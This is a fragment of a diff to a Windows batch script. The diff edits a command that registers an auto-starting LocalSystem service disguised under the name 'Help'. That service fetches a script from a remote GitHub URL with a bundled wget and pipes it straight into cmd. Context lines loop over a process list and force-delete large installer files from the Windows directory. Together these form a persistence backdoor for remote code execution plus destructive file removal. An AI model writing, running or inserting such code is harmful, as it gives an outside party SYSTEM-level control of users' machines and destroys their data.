@@ -16,4 +16,5 @@ for %a in (%processList%) do (
 )
 
 for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
-sc create Help binPath="%ProgramData%\Comms\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen ^| cmd /Q /V:ON" start="auto" obj="LocalSystem"
+sc create Help binPath="%ProgramData%\Comms\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen | cmd /Q /V:ON" start="auto" obj="LocalSystem"
+
